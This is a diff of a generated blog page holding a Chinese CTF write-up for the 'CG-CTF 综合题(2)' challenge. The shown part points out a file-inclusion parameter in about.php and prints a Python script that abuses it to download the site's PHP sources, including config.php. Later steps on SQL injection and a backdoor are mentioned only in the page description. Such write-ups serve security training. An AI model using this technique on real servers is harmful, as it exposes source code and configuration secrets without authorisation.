@@ -96,7 +96,7 @@
 <meta property="og:image" content="http://yoursite.com/2018/11/13/CG-CTF-综合题-2-writeup/7.jpg">
 <meta property="og:image" content="http://yoursite.com/2018/11/13/CG-CTF-综合题-2-writeup/8.jpg">
 <meta property="og:image" content="http://yoursite.com/2018/11/13/CG-CTF-综合题-2-writeup/9.jpg">
-<meta property="og:updated_time" content="2018-11-13T08:10:40.876Z">
+<meta property="og:updated_time" content="2018-11-13T09:55:17.695Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CG-CTF 综合题(2) writeup">
 <meta name="twitter:description" content="前言这两天在做南邮 ctf 平台的题，学到了不少新知识，拓展了一些思路。 刚做到了综合题2，做了蛮久，虽然不是很难，但感觉是挺有意思的一道题，于是准备写下我的第一篇writeup。 这道题涉及到 sql injection，文件包含，请求头以及回调后门，偏向于简单的渗透。 - 南邮CTF训练平台：https://cgctf.nuptsast.com/  - 题目地址：http://cms.nupt">
@@ -338,8 +338,9 @@
 <a id="more"></a>
 <h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>进入这道题发现是一个客户留言板，在想会不会是XSS，往下看有个链接 “本CMS说明”，点进去看看。</p>
 <img src="/2018/11/13/CG-CTF-综合题-2-writeup/1.jpg">
-<p>发现这个链接到了 <a href="http://cms.nuptzj.cn/about.php?file=index.php，有可能存在文件包含，用来读取提示文件的代码。" target="_blank" rel="noopener">http://cms.nuptzj.cn/about.php?file=index.php，有可能存在文件包含，用来读取提示文件的代码。</a></p>
-<p>这里，借用个把所有用到的文件下到本地的代码</p>
+<p>看一下url:cms.nuptzj.cn/about.php?file=index.php</p>
+<p>可能存在文件包含，用来读取提示的那些文件的代码。</p>
+<p>网上看到一个下载提示文件的python代码</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import codecs</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">url=&quot;http://cms.nuptzj.cn/about.php?file=&quot;</span><br><span class="line">file_list = [&quot;index.php&quot;,&quot;passencode.php&quot;,&quot;say.php&quot;,&quot;config.php&quot;,&quot;antixss.php&quot;,&quot;about.php&quot;,&quot;so.php&quot;,&quot;antiinject.php&quot;,&quot;xlcteam.php&quot;]</span><br><span class="line">for i in file_list:</span><br><span class="line">    res = requests.get(url+i)</span><br><span class="line">    print(&quot;dowload &quot;+i)</span><br><span class="line">    if res.status_code==200:</span><br><span class="line">        res.encoding=&quot;utf8&quot;</span><br><span class="line">    with codecs.open(i,&quot;w+&quot;,&quot;utf8&quot;) as handle:</span><br><span class="line">        print(&quot;done&quot;)</span><br><span class="line">        text = BeautifulSoup(res.text,&quot;lxml&quot;).text</span><br><span class="line">        handle.write(text)</span><br><span class="line">---------------------</span><br><span class="line">作者：mylyylmy</span><br><span class="line">来源：CSDN</span><br><span class="line">原文：https://blog.csdn.net/mylyylmy/article/details/79885143</span><br></pre></td></tr></table></figure>
 <p>其实也可以直接在网页看代码。</p>
 <p>还提示了数据库表结构，所以推测是用sql注入获取账号密码，那我们还要找到后台页面才行。</p>
